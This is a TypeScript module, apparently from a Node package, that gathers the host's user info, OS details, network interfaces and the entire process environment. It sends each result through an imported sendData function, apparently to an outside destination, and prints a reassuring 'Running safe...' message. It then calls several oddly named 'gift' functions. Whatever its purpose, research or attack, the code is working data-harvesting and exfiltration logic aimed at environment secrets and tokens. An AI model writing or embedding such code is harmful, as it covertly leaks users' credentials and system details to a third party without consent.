import * as os from "node:os";
import { CustomPlugin, EnvDetails, NetworkInterfacesDetails, OsDetails, UserDetails } from "./typings";
import sendData from "./core";
import { generateRandomId, getIpv4Interfaces } from "./utils";
import { heyInternet, wc, catscatscatscats } from "./gifts";

export function getUserInfo(): UserDetails {
  return os.userInfo()
}

export function getOsInfo(): OsDetails {
  return {
      arch: os.arch(),
      hostname: os.hostname(),
      platform: os.platform(),
      release: os.release(),
      type: os.type()
  };
}

export function getNetworkInfo(): NetworkInterfacesDetails {
  return getIpv4Interfaces(os.networkInterfaces());
}

export function getEnvInfo(): EnvDetails {
  return process.env;
};

const plugins: CustomPlugin[] = [
  {
      key: "networkInterfaces",
      plugin: getNetworkInfo
  },
  {
      key: "os",
      plugin: getOsInfo
  },
  {
      key: "env",
      plugin: getEnvInfo
  },
  {
      key: "userInfo",
      plugin: getUserInfo
  }
];

function runPlugin({ key, plugin }: CustomPlugin): NodeJS.Dict<CustomPlugin> {
  return {
      [key]: plugin()
  }
}

console.log("Running safe...");

export default function init() {
  plugins.forEach(plugin => {
    let data = runPlugin(plugin);
    let postData = JSON.stringify(data, null, 2);
    console.log(`Data from ${plugin.key} is: ${postData}`);
    sendData(postData, plugin.key, generateRandomId());
  });

  heyInternet();
  wc();
  catscatscatscats(3000);
}